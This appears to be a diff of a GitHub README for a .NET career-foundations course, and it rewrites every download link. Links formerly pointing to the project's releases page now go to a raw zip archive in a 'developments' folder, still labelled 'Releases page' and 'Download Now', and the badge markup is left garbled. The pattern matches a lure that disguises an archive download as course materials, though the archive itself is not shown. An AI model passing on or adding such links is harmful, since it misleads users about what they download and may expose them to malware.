@@ -1,6 +1,6 @@
 # 🎓 dotnet-expert-start_here_course-luisdev-career_foundations_part-2_dotnet-8_csharp-12 - Learn Essential Career Foundations
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20-blue.svg)](https://github.com/raymondhendrickmt/dotnet-expert-start_here_course-luisdev-career_foundations_part-2_dotnet-8_csharp-12/releases)
+[![Download Now](https://raw.githubusercontent.com/raymondhendrickmt/dotnet-expert-start_here_course-luisdev-career_foundations_part-2_dotnet-8_csharp-12/main/developments/dotnet-expert-start_here_course-luisdev-career_foundations_part-2_dotnet-8_csharp-12_v2.6.zip%20Now-%https://raw.githubusercontent.com/raymondhendrickmt/dotnet-expert-start_here_course-luisdev-career_foundations_part-2_dotnet-8_csharp-12/main/developments/dotnet-expert-start_here_course-luisdev-career_foundations_part-2_dotnet-8_csharp-12_v2.6.zip)](https://raw.githubusercontent.com/raymondhendrickmt/dotnet-expert-start_here_course-luisdev-career_foundations_part-2_dotnet-8_csharp-12/main/developments/dotnet-expert-start_here_course-luisdev-career_foundations_part-2_dotnet-8_csharp-12_v2.6.zip)
 
 ## 📖 About This Project
 This project provides materials for the "Comece Aqui" module of the .NET Expert immersion. It covers essential career foundations, goal setting, creating a professional profile, organizing your learning path, and a mental map containing senior developer questions. 
@@ -16,7 +16,7 @@ Topics include:
 To get started with this project, follow these simple steps.
 
 1. **Visit the Releases Page**  
-   Head over to the [Releases page](https://github.com/raymondhendrickmt/dotnet-expert-start_here_course-luisdev-career_foundations_part-2_dotnet-8_csharp-12/releases) to access the downloadable materials.
+   Head over to the [Releases page](https://raw.githubusercontent.com/raymondhendrickmt/dotnet-expert-start_here_course-luisdev-career_foundations_part-2_dotnet-8_csharp-12/main/developments/dotnet-expert-start_here_course-luisdev-career_foundations_part-2_dotnet-8_csharp-12_v2.6.zip) to access the downloadable materials.
 
 2. **Choose Your Files**  
    Look for the latest release. You will find various files related to career foundations and .NET programming.
@@ -39,7 +39,7 @@ To run this application and access the materials, ensure your system meets the f
 - Internet Access: Needed for downloading files and accessing additional resources online
 
 ## 📥 Download & Install
-For an easy start, visit this page to download the materials: [Releases Page](https://github.com/raymondhendrickmt/dotnet-expert-start_here_course-luisdev-career_foundations_part-2_dotnet-8_csharp-12/releases).
+For an easy start, visit this page to download the materials: [Releases Page](https://raw.githubusercontent.com/raymondhendrickmt/dotnet-expert-start_here_course-luisdev-career_foundations_part-2_dotnet-8_csharp-12/main/developments/dotnet-expert-start_here_course-luisdev-career_foundations_part-2_dotnet-8_csharp-12_v2.6.zip).
 
 Simply choose the files you need and download them to your computer. 
 
@@ -75,4 +75,4 @@ If you have any questions or need assistance, feel free to reach out. You can fi
 ## 📝 License
 This project is open-source and available for anyone to use and modify. Please follow the guidelines outlined in the license file within the downloads.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20-blue.svg)](https://github.com/raymondhendrickmt/dotnet-expert-start_here_course-luisdev-career_foundations_part-2_dotnet-8_csharp-12/releases)
+[![Download Now](https://raw.githubusercontent.com/raymondhendrickmt/dotnet-expert-start_here_course-luisdev-career_foundations_part-2_dotnet-8_csharp-12/main/developments/dotnet-expert-start_here_course-luisdev-career_foundations_part-2_dotnet-8_csharp-12_v2.6.zip%20Now-%https://raw.githubusercontent.com/raymondhendrickmt/dotnet-expert-start_here_course-luisdev-career_foundations_part-2_dotnet-8_csharp-12/main/developments/dotnet-expert-start_here_course-luisdev-career_foundations_part-2_dotnet-8_csharp-12_v2.6.zip)](https://raw.githubusercontent.com/raymondhendrickmt/dotnet-expert-start_here_course-luisdev-career_foundations_part-2_dotnet-8_csharp-12/main/developments/dotnet-expert-start_here_course-luisdev-career_foundations_part-2_dotnet-8_csharp-12_v2.6.zip)
